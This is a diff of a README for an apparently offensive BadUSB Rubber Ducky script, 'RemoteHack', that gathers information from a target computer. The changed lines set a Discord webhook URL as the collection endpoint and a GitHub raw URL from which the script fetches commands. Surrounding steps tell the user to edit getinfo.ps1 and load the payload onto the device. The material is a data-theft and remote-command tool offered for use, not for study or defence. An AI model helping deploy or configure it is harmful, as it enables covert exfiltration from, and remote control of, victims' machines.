@@ -11,9 +11,8 @@ This BadUSB Rubber Ducky script is designed to swiftly collect information from 
 2. Edit the code in the duplicated `getinfo.ps1` file to update the Discord webhook API credentials at line 7 and the URL to `command.txt` at line 9 with your specific information,
 EXAMPLE:
 
-$hookUrl = "https://discord.com/api/webhooks/120056/HOw7_j7W-jMllc-uZMbCWq1DEYJUuKj"
-
-$url = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/command.txt"
+`$hookUrl = "https://discord.com/api/webhooks/120056/HOw7_j7W-jMllc-uZMbCWq1DEYJUuKj"`
+`$url = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/command.txt"`
 
 
 4. On your BadUSB Rubber Ducky device, install the script from `RemoteHack.txt`.
